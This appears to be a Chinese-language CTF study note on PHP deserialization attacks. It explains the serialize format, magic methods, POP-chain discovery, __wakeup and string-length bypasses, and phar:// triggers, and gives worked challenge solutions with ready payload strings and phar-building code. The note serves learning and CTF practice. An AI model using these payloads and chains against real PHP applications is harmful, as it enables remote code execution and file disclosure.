# 反序列化专题（PHP Deserialization）

> **一句话:应用把用户可控的字符串丢进 `unserialize()`,而反序列化会**触发魔术方法**,
> 于是你能让代码按你的意思执行。**

---

## 一、先认识序列化格式

**PHP 的 `serialize()` 把变量变成字符串,`unserialize()` 再变回来。**

### 各种类型长什么样

| 类型 | 格式 | 例子 |
|---|---|---|
| **整数** | `i:值;` | `i:123;` |
| **浮点** | `d:值;` | `d:1.5;` |
| **布尔** | `b:0/1;` | `b:1;` |
| **字符串** | `s:长度:"内容";` | `s:5:"hello";` |
| **数组** | `a:元素个数:{键值对}` | `a:2:{i:0;s:1:"a";i:1;s:1:"b";}` |
| **对象** | `O:类名长:"类名":属性数:{...}` | `O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}` |
| **NULL** | `N;` | `N;` |

### 一个对象拆开看

```php
class Flag { public $file = "flag.php"; }
serialize(new Flag());
```

```text
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
│ │  │      │  └────────────┬────────────┘
│ │  │      │          属性名 + 属性值
│ │  │      └── 属性个数 = 1
│ │  └── 类名长度 = 4
│ └── O = object
└── 类型前缀
```

!!! warning "三个数字必须全对"

    ```
    O:4:"Flag"   ← 4 = 类名字符数
    :1:          ← 1 = 属性个数
    s:8:"flag.php"  ← 8 = 字符串长度
    ```

    **任何一个对不上,`unserialize()` 直接失败(返回 false,通常静默)。**
    这也是自己手写 payload 最常见的错。

## 二、漏洞是怎么产生的

```php
$data = $_GET['data'];
$obj = unserialize($data);     // ← 危险点
echo $obj;                     // ← 或者任何后续操作
```

**光 `unserialize` 还不一定能打,关键是**有没有魔术方法被触发**。**

### 触发链的本质

```text
你给的字符串
   ↓ unserialize
构造出一个对象(属性全由你控制)         ← 第一步:控制属性
   ↓ 后续代码对它的操作
某个魔术方法被调用                      ← 第二步:触发方法
   ↓ 方法里用了你控制的属性
敏感操作(读写文件 / 执行命令 / 发起请求)  ← 第三步:达成目的
```

**这三步连起来就是「POP 链」(Property-Oriented Programming)。**

---

## 三、魔术方法速查表

| 方法 | 什么时候被调用 |
|---|---|
| `__construct()` | `new` 一个对象时 |
| `__destruct()` | 对象被销毁(脚本结束、unset)时 |
| **`__wakeup()`** | **`unserialize()` 之后立刻** |
| `__sleep()` | `serialize()` 之前 |
| **`__toString()`** | **对象被当字符串用**(`echo`、拼接)时 |
| `__invoke()` | 对象被当函数调用 `$obj()` 时 |
| `__get($name)` | 读不可访问/不存在的属性时 |
| `__set($name,$v)` | 写不可访问属性时 |
| `__isset()` | 对不可访问属性用 `isset()` |
| `__unset()` | 对不可访问属性用 `unset()` |
| `__call($n,$a)` | 调用不存在的方法时 |
| `__callStatic()` | 静态调用不存在的方法时 |
| `__clone()` | `clone` 时 |

**做题时先搜这几个名字,找到它们内部干了什么。**

## 四、怎么构造 payload

### 最稳的办法:本地生成

**别手写序列化串,写个 PHP 脚本 `serialize()` 出来:**

```php
<?php
class Flag { public $file = "/flag"; }
$a = new Flag();
echo serialize($a);          // O:4:"Flag":1:{s:4:"file";s:5:"/flag";}
```

**本机有 PHP 就跑一下(`E:\dsh\tools\php74\php.exe`),没有就按格式手写。**

### 属性可见性:三种写法完全不同 ⚠️

| 声明 | 序列化后的属性名 |
|---|---|
| `public $file` | `file` |
| `protected $file` | `\0*\0file`(`*` 两侧各有一个 NUL) |
| `private $file` | `\0Flag\0file`(`\0` + 类名 + `\0` + 属性名) |

**`\0` 是不可见字符,手写时极易出错。**

**URL 里要写成 `%00`:**

```text
O:4:"Flag":1:{s:7:"%00*%00file";s:5:"/flag";}
```

**注意这时长度要按真实字节数算(`\0` 算 1 字节):`\0*\0file` 是 7 字节。**

### 生成的 payload 要 URL 编码

**序列化串里有 `"` `{` `}` `;`,直接放 URL 会被截断。建议全编码:**

```text
O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D
```

## 五、四种常见绕过

### ① 绕过 `__wakeup()`

**如果 `__wakeup` 里做了检查(比如 `die`),可以让它**不被调用**:**

```text
O:4:"Flag":2:{s:4:"file";s:8:"flag.php";}
          ↑
    把属性个数改得比真实的多
```

**PHP < 5.6.25 / 7.0.10 有这个 bug(CVE-2016-7124):属性数大于真实数时,`__wakeup` 被跳过。**

### ② 长度不一致

**`s:8:"flag.php"` 里的 8 必须对。** 有些场景可以利用长度错位吃掉后面的字符(如 `s:5:"abc";}`)。

#### 过滤把字符串变长了(`str_replace` 类)

**这是长度不一致里最实用的一种。入口一般是「序列化 → 过滤 → 反序列化」:**

```php
$ser = serialize($entry);
$escaped = filter($ser);       // 例如 str_replace("admin", "hacker", $data)
unserialize($escaped);
```

**`admin`(5 字节) 换成 `hacker`(6 字节),每替换一次多 1 字节;但长度数字是**过滤前**写进去的,不会跟着涨。**

```text
过滤前   声明长度 N = 5A + len(b)
过滤后   实际长度   = 6A + len(b)        A = 短串出现次数，b = 注入串
解析器   只读 N 个字节 → 落在 5A + len(b) 这个位置
```

**把注入串 b 放在被过滤值的末尾,且 **b 以 `";` 开头**。这个 `";` 在过滤后处于 `6A` 处,要让解析器正好读到这里:**

```text
5A + len(b) = 6A        →        A = len(b)
```

**也就是:短串重复的个数,必须等于注入串的长度。**

| 量 | 含义 |
|---|---|
| `A` | 被替换的短串重复次数(如 `admin` 出现几次) |
| `b` | 注入串,**必须以 `";` 开头**,后面接想伪造的结构 |
| 关键等式 | `A == len(b)`,多一个少一个都会错位,`unserialize` 静默失败 |

**⚠️ 换命令时 b 会变长,`A` 必须跟着改。** 长度用 `echo strlen($b)` 输出,不要手数。

**判定成功的标志:** 目标的多层 `echo` 依次出现(如 `Welcome…` → `？！强强？！` → `还有第二关` → `马上就到了` → `还有一步` → `RCE:`),说明每一层魔术方法都被触发了。

**和 ① 的区别:** ① 改的是「属性个数」,跳过 `__wakeup`;这里改的是「字符串长度」,让解析位置整体错位。两者都在利用**声明与实际不一致**。

→ 实战见 [9.5 Geek_Challenge2026](#95-geek_challenge2026)

### ③ 大写 `S` 转义

**`s` 有对应的大写形式 `S`,允许十六进制转义:**

```text
S:5:"\61\62\63\64\65"       ← 等价于 s:5:"abcde"
```

**用来绕过对特定字符串的正则匹配。**

### ④ 引用 `&`

```text
a:2:{i:0;s:4:"test";i:1;R:2;}
```

**`R:2` 表示引用第 2 个元素 —— 可以让两个属性指向同一个值。**

## 六、phar 反序列化(不需要 `unserialize`)

**这是最容易被忽略的一种。**

**只要代码里出现了 `phar://` 协议的文件操作,就会触发 phar 内部元数据的反序列化:**

```php
file_exists("phar://uploads/avatar.jpg/test.txt");
```

**哪怕只是 `file_exists` / `filesize` / `getimagesize`,也会触发。**

**条件:**

```
① 有一个 phar 文件(通常靠文件上传)
② 代码里能控制到 phar:// 的路径
③ 有可用的魔术方法链
```

**生成 phar 需要 `phar.readonly=Off`:**

```php
$p = new Phar("evil.phar");
$p->startBuffering();
$p["test.txt"] = "x";                 // 随便一个文件
$p->setStub("<?php __HALT_COMPILER(); ?>");
$p->setMetadata(new Flag());          // ← 这里放对象,序列化后存进 phar
$p->stopBuffering();
```

**把 `evil.phar` 改名成 `.jpg` 上传,再用 `phar://` 引用即可。**

**⚠️ PHP 8.0 之后,phar:// 的反序列化被限制了很多场景。**

## 七、POP 链怎么找

**别从头读代码 —— 从「能干活的那个函数」往回找。**

### 逆推四步

```text
① 找 sink        哪个函数能读文件 / 执行代码 / 删文件
                  include / eval / system / file_get_contents / call_user_func
② 谁能碰到它      哪个魔术方法里调用了它
③ 那个方法怎么触发 对象当字符串?当函数?读不存在的属性?
④ 一路往回        直到 __wakeup / __destruct / unserialize
```

**Ezpop 就是这么找出来的:**

```text
include($value)                         ← ① sink
  ← Modifier::__invoke()                ← ② 谁调用了它
      ← 对象被当函数 $function()         ← ③ 怎么触发
      ← Test::__get()                   ← ② 谁在调用函数
          ← 读不存在的属性               ← ③
          ← Show::__toString()          ← ②
              ← 对象当字符串             ← ③
              ← Show::__wakeup()        ← ② 入口
```

### 魔术方法触发条件（找链时反复查这张表）

| 方法 | 触发时机 |
|---|---|
| `__wakeup` | `unserialize()` 之后 |
| `__destruct` | 对象销毁 / 脚本结束 |
| `__toString` | 对象被当**字符串**（拼接、`echo`、传给字符串函数） |
| `__invoke` | 对象被当**函数**调用 `$obj()` |
| `__get` | 读**不存在或不可访问**的属性 |
| `__set` | 写不可访问的属性 |
| `__call` | 调不存在的方法 |
| `__isset` / `__unset` | 对不可访问属性用 `isset` / `unset` |

**⚠️ 最容易搞错的一条：`__get` 不是「属性值为空」，是「这个类里根本没有这个属性」。**

```php
class Test { public $p; }
$t = new Test();
$t->source;            // ★ 触发 __get（类里没有 source）

$t->source = null;
$t->source;            // ❌ 不触发（属性存在了，只是值为 null）
```

**所以「让某个属性不存在」比「把它设成 null」更重要 —— 而且往往你什么都不用做。**

**危险操作(链尾)通常是:**

```
file_get_contents / file_put_contents / unlink / system / eval / call_user_func
```

**一个最小的链长这样:**

```php
class A { public $cmd;  function __destruct() { eval($this->cmd); } }
```

```text
O:1:"A":1:{s:3:"cmd";s:6:"phpinfo";}
```

**`__destruct` 在脚本结束时自动触发 → 不需要额外操作。**

### 9.2 ✅ [极客大挑战 2019] PHP —— `__wakeup` 绕过

**入口:**

```php
include 'class.php';
$select = $_GET['select'];
$res = unserialize(@$select);
```

**类:**

```php
class Name {
    private $username = 'nonono';
    private $password = 'yesyes';

    function __wakeup(){ $this->username = 'guest'; }   // ← 后门:反序列化后强制改名

    function __destruct(){
        if ($this->password != 100) { echo "NO!!!hacker!!!"; die(); }
        if ($this->username === 'admin') { global $flag; echo $flag; }
    }
}
```

**分析:**

```
① 目标是 username === 'admin' 且 password == 100
② 但 __wakeup 会把 username 改成 guest
③ 必须让 __wakeup 不执行
```

**payload:**

```text
O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
              └───────── 14 字节 ─────────┘
```

**两个细节:**

| 细节 | 说明 |
|---|---|
| **属性数写 3**（实际只有 2 个） | `__wakeup` 被跳过（CVE-2016-7124，PHP < 5.6.25 / 7.0.10） |
| **`private` 属性名带 `\0`** | `\0Name\0username` = 14 字节；URL 里写 `%00` |

**⚠️ 新版 PHP 上 `:3:` 不是跳过 `__wakeup`，而是整个包**解析失败**。这题只在老版本环境成立。**

### 9.3 ✅ [MRCTF2020] Ezpop —— 第一条完整的 POP 链

**三个类,三个魔术方法,一个 sink:**

```php
class Modifier {
    protected $var;
    public function append($value){ include($value); }   // ← sink
    public function __invoke(){ $this->append($this->var); }
}
class Show{
    public $source; public $str;
    public function __toString(){ return $this->str->source; }
    public function __wakeup(){ preg_match("/.../i", $this->source); }   // ← 入口(过滤反而成了跳板)
}
class Test{
    public $p;
    public function __get($key){ $function = $this->p; return $function(); }
}
```

**链(逆推找出来的):**

```text
include ← __invoke ← __get ← __toString ← __wakeup ← unserialize
```

**正向执行:**

```text
unserialize
 → Show::__wakeup       preg_match 把 $source(对象) 当字符串 → __toString
 → Show::__toString     $this->str->source 读不存在的属性 → __get
 → Test::__get          $function() 对象当函数 → __invoke
 → Modifier::__invoke   $this->append($this->var)
 → include($var)
```

**四层各要什么类型:**

| 层 | 属性 | 必须是 |
|---|---|---|
| 外层 `Show` | `source` | 内层 `Show` 对象(有 `__toString`) |
| 内层 `Show` | `str` | `Test` 对象 |
| `Test` | `p` | `Modifier` 对象 |
| `Modifier` | `var` | 路径字符串 |

**三个必须记住的点:**

| 点 | 说明 |
|---|---|
| **`__get` 的触发条件是「类里没这个属性」** | **不是「值为空」**。`Test` 只有 `$p`,读 `->source` 必然触发,什么都不用设 |
| **`__wakeup` 里的过滤成了入口** | 过滤 `preg_match($this->source)` 把对象当字符串 → 触发 `__toString` |
| **`protected $var` 要加构造函数** | 外部赋值会 `Cannot access protected property`;序列化后是 `\0*\0var`(6 字节) |

**`var` 用 `php://filter/convert.base64-encode/resource=flag.php`** —— 直接 include 会执行掉,编码后是纯文本才会原样输出。

**⚠️ 链跑完会报 `Method Show::__toString() must return a string value`** —— 因为 include 返回 int。**但 include 已经执行完,报错在后面,不影响。**

→ 详见 WP：[/blog/mrctf2020-ezpop/](../../blog/posts/2026-10-26-mrctf2020-ezpop.md)

### 9.4 ✅ [HNCTF 2022 WEEK3] ez_phar —— 不用 `unserialize` 的入口

**前面三条全靠 `unserialize()` 起头。这一条没有 `unserialize`，链是从**文件函数**进去的。**

**源码就四行有用：**

```php
class Flag{
    public $code;
    public function __destruct(){ eval($this->code); }
}
$filename = $_GET['filename'];
file_exists($filename);
```

**关键差别:**

| | 前三条 | 这一条 |
|---|---|---|
| 入口 | `unserialize($input)` | **`file_exists($filename)`** |
| 触发时机 | 调用那一刻 | **PHP 解析 `phar://` 那一刻** |
| 文件后缀 | — | **无所谓,`.jpg` 也行** |

**为什么能 —— 一句话:**

> phar 的 manifest 里可以存一段**序列化 metadata**。任何函数只要访问 `phar://` 开头的路径,
> PHP 就解析这个 phar,解析时把 metadata **自动反序列化**,对象被重建,
> 脚本结束 → `__destruct()` 自动执行。

**所以 phar 的本质:把「反序列化」的引信从 `unserialize()` 挪到了「文件操作 + 可控路径」。**

**能当触发点的文件函数(记一份):**

```text
file_exists   is_file   filesize   getimagesize   file_get_contents
file_put_contents   copy   unlink   fopen   include   md5_file
exif_read_data   get_meta_tags
```

**为什么必须用 `Phar` 类生成,不能手写:**

| 字段 | 为什么手改会崩 |
|---|---|
| stub 后的 4 字节 | **manifest 总长度**,必须等于后面所有字节之和 |
| metadata 前的 4 字节 | **序列化串长度**,改一个字符就错 |

**另外 `new Phar('x.jpg')` 会报错 —— 创建时必须 `.phar` 结尾。**
**所以流程是:生成 `x.phar` → 改名 `x.jpg` → 上传。**

**⚠️ 生成时 `phar.readonly` 默认是 1,必须关:**

```powershell
php.exe -d phar.readonly=0 ds.php
```

**⚠️ eval 里必须是合法 PHP。** 我第一次写 `ls /`(shell 命令),页面报:

```text
Parse error: syntax error, unexpected end of file
in /var/www/html/index.php(7) : eval()'d code on line 1
```

**这行报错反而是最好的证据:** `eval()'d code` 说明 `__destruct` 跑了,
`index.php(7)` 说明就是那行 `eval`,而 `syntax error` 说明整条链已经通,只是内容不对。

**判读顺序:`eval()'d code` 一出现,后面就只剩「写对 payload」这一件事了。**

→ 详见 WP:[/blog/hnctf2022-ezphar/](../../blog/posts/2026-10-27-hnctf2022-ezphar.md)

### 9.5 ✅ Geek_Challenge2026 —— 过滤把长度变长

**入口极简:两个参数进 A 类,`serialize` 之后过一个 `str_replace("admin","hacker")`,再 `unserialize`。**

**链是六层,从终点倒推:**

```text
F::__set  system($value)                 ← 终点
  ↑ E::__get  写 $sink->flag_trigger
    ↑ D::__call  读 $next->$p
      ↑ C::__invoke  调 $target->$m()
        ↑ B::__toString  (string)$func()
          ↑ A::__destruct  echo "…" . $this->sign
```

**两个关键点:**

**① `C::__invoke` 里的条件是反的 —— 要求 `target` 有 `__call`,且方法名**不能**真实存在。** 看反了就会一直返回空。

**② 长度数字是过滤前算的:** `A`(admin 个数)必须等于注入串长度,解析器才会正好停在注入的 `";` 上。这题是 192 —— 因为 b 正好 192 字节。

**判定成功的标志:** 后台的六句 `echo` 会一句句出现,最后是 `RCE:`。

## 十、我踩的坑

> 打的过程中往里填。格式:**现象 → 原因 → 正确做法**。

### 坑 1:属性个数 / 字符串长度写错

**现象:页面空白,什么都没发生。**

**原因:序列化串里 `O:4:` 后面的 `4` 或 `s:8:` 后面的 `8` 对不上,`unserialize` 静默返回 false。**

**做法:改完 payload 一定数一遍长度;能用本地 `serialize()` 生成就别手写。**

### 坑 2:private / protected 属性写成 public 的格式

**现象:`__tostring` 不触发,或者属性读不到。**

**原因:`private $file` 序列化后是 `\0Flag\0file`,不是 `file`。**

**做法:本地 `var_dump(serialize($obj))` 看一眼原始字节。**

### 坑 3:URL 里忘了编码

**现象:payload 被截断,只有前半截。**

**原因:`{` `}` `;` `"` 在 URL 里有特殊含义。**

**做法:整条 URL 编码,或至少编码 `{ } ; "`。**

### 坑 4:以为 `unserialize` 就一定触发 `__construct`

**不会。`unserialize` 触发的是 `__wakeup`,**不是 `__construct`**。**

**`__construct` 只在 `new` 时调用。**

## 十一、一句话总结

> **反序列化 = 用字符串重建对象,属性值全由你控制。**
>
> **找洞三步:哪里 `unserialize` → 哪个魔术方法会被触发 → 方法里用了哪个属性。**
>
> **构造方式:本地写 PHP `serialize()` 生成,别手写。**
>
> **没有 `unserialize` 也别放弃 —— `phar://` 一样能触发。**
